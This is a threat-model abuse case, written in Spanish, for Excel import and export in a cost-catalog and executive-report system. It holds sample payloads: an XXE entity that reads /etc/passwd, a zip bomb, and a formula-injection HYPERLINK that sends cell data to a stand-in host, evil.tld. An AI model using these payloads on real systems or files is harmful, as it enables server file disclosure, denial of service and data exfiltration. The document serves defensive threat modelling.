---
id: ABUSE-XLSX-INJECT-001
type: abuse-case
title: "Inyección de Fórmulas DDE, XXE y Bombas ZIP en Importación y Exportación de Excel"
status: draft
version: "1.0.0"
schema-version: "1.0"
primary-threat-actor: ACT-THREAT-EXT-001
targets-use-cases:
  - UC-COST-CATALOG-001
  - UC-EXEC-REPORT-001
stride-category: "Tampering"
severity: "HIGH"
likelihood: "MEDIUM"
mitigated-by:
  - SEC-REQ-XLSX-001
supersedes: null
superseded-by: null
---

# Abuse Case: Inyección de Fórmulas DDE, XXE y Bombas ZIP en Importación y Exportación de Excel

## 1. Attack Scenario & Preconditions

El atacante (`ACT-THREAT-EXT-001`) abusa de la funcionalidad de importación de catálogos mediante plantilla `.xlsx` (`M4` en `UC-COST-CATALOG-001`) o inyecta nombres de servicios/productos maliciosos que luego se exportan a `.xlsx` en los informes ejecutivos (`UC-EXEC-REPORT-001`).

## 2. Attack Flow (Step-by-Step)

1. **Vector A (XXE / Zip Bomb en Importación `.xlsx`)**: Dado que un archivo `.xlsx` es un contenedor ZIP con documentos XML internos, el atacante sube un archivo de 100 KB que al descomprimirse en memoria ocupa 10 GB (Zip Bomb) o incluye entidades externas XML (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) para leer archivos del servidor.
2. **Vector B (CSV/Excel Formula Injection - DDE)**: El atacante introduce como nombre de cosmético o servicio una cadena que comienza por `=`, `+`, `-`, `@`, `\t` o `\r` (ej. `=HYPERLINK("http://evil.tld/leak?data="&A1)`). Cuando la gestora descarga el informe ejecutivo en Excel (`UC-EXEC-REPORT-001`), su cliente de hoja de cálculo ejecuta la fórmula maliciosa.
3. **Vector C (Corrupción Aritmética)**: El atacante inyecta valores `NaN`, `Infinity`, costes negativos o cantidades `0` en divisores para corromper el motor de recálculo en cascada.

## 3. Business & Security Impact

- **Compromiso de Servidor o Cliente**: Lectura de archivos internos del servidor (XXE), caída por agotamiento de RAM (OOM) o ejecución de comandos/exfiltración en el equipo de la gestora al abrir el informe Excel.

## 4. Revision History

| Version | Date | Author | Description |
| :--- | :--- | :--- | :--- |
| 1.0.0 | 2026-10-05 | agent-threat-modeler | Especificación inicial del caso de abuso en importación/exportación Excel. |
